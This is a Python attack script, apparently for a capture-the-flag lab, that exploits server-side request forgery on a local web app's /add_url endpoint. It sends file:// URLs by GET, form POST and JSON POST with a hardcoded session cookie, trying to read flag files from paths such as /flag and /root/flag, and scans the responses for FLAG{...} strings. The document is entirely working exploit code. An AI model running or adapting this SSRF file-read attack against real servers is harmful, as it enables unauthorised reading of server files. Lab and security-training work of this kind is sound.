import requests
import re
import time

# Target configuration
base_url = "http://127.0.0.1:5003"
endpoint = "/add_url"

# Session cookie from context
cookies = {
    'session': 'eyJfZnJlc2giOmZhbHNlfQ.aVpTCA.s-VGf6vmfbtBjEeQRdAqLSxxbxE'
}

# File paths to test
file_paths = [
    "file:///flag",
    "file:///flag.txt",
    "file:///app/flag",
    "file:///app/flag.txt",
    "file:///tmp/flag",
    "file:///root/flag",
    "file:///etc/flag"
]

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'application/json, text/plain, */*'
}

print("[*] Testing SSRF File Protocol Exploitation")
print(f"[*] Target: {base_url}{endpoint}")
print("=" * 80)

# Test 1: GET requests with query parameter
print("\n[TEST 1] GET requests with query parameter")
print("-" * 80)

for file_path in file_paths:
    try:
        start_time = time.time()
        url = f"{base_url}{endpoint}"
        params = {'url': file_path}
        
        print(f"\n[+] Testing: GET {url}?url={file_path}")
        
        response = requests.get(
            url,
            params=params,
            cookies=cookies,
            headers=headers,
            timeout=10
        )
        
        elapsed = time.time() - start_time
        
        print(f"[+] Status: {response.status_code} | Time: {elapsed:.3f}s | Length: {len(response.content)}B")
        print(f"[+] Response Headers: {dict(response.headers)}")
        print(f"[+] Response Body:\n{response.text}")
        
        # Check for success indicators
        if 'success' in response.text.lower() and 'true' in response.text.lower():
            print("[!] SUCCESS INDICATOR FOUND: success:true")
        
        # Check for FLAG pattern
        flag_match = re.search(r'FLAG\{[^}]+\}', response.text, re.IGNORECASE)
        if flag_match:
            print(f"[!!!] FLAG FOUND: {flag_match.group(0)}")
        
    except requests.exceptions.Timeout:
        print(f"[-] Request timed out after 10s")
    except Exception as e:
        print(f"[-] Error: {type(e).__name__}: {str(e)}")

# Test 2: POST requests with form data
print("\n\n[TEST 2] POST requests with form data (application/x-www-form-urlencoded)")
print("-" * 80)

for file_path in file_paths:
    try:
        start_time = time.time()
        url = f"{base_url}{endpoint}"
        data = {'url': file_path}
        
        print(f"\n[+] Testing: POST {url} with data={data}")
        
        response = requests.post(
            url,
            data=data,
            cookies=cookies,
            headers=headers,
            timeout=10
        )
        
        elapsed = time.time() - start_time
        
        print(f"[+] Status: {response.status_code} | Time: {elapsed:.3f}s | Length: {len(response.content)}B")
        print(f"[+] Response Headers: {dict(response.headers)}")
        print(f"[+] Response Body:\n{response.text}")
        
        # Check for success indicators
        if 'success' in response.text.lower() and 'true' in response.text.lower():
            print("[!] SUCCESS INDICATOR FOUND: success:true")
        
        # Check for FLAG pattern
        flag_match = re.search(r'FLAG\{[^}]+\}', response.text, re.IGNORECASE)
        if flag_match:
            print(f"[!!!] FLAG FOUND: {flag_match.group(0)}")
        
    except requests.exceptions.Timeout:
        print(f"[-] Request timed out after 10s")
    except Exception as e:
        print(f"[-] Error: {type(e).__name__}: {str(e)}")

# Test 3: POST requests with JSON data
print("\n\n[TEST 3] POST requests with JSON data (application/json)")
print("-" * 80)

json_headers = headers.copy()
json_headers['Content-Type'] = 'application/json'

for file_path in file_paths:
    try:
        start_time = time.time()
        url = f"{base_url}{endpoint}"
        json_data = {'url': file_path}
        
        print(f"\n[+] Testing: POST {url} with JSON={json_data}")
        
        response = requests.post(
            url,
            json=json_data,
            cookies=cookies,
            headers=json_headers,
            timeout=10
        )
        
        elapsed = time.time() - start_time
        
        print(f"[+] Status: {response.status_code} | Time: {elapsed:.3f}s | Length: {len(response.content)}B")
        print(f"[+] Response Headers: {dict(response.headers)}")
        print(f"[+] Response Body:\n{response.text}")
        
        # Check for success indicators
        if 'success' in response.text.lower() and 'true' in response.text.lower():
            print("[!] SUCCESS INDICATOR FOUND: success:true")
        
        # Check for FLAG pattern
        flag_match = re.search(r'FLAG\{[^}]+\}', response.text, re.IGNORECASE)
        if flag_match:
            print(f"[!!!] FLAG FOUND: {flag_match.group(0)}")
        
    except requests.exceptions.Timeout:
        print(f"[-] Request timed out after 10s")
    except Exception as e:
        print(f"[-] Error: {type(e).__name__}: {str(e)}")

print("\n" + "=" * 80)
print("[*] SSRF File Protocol Testing Complete")

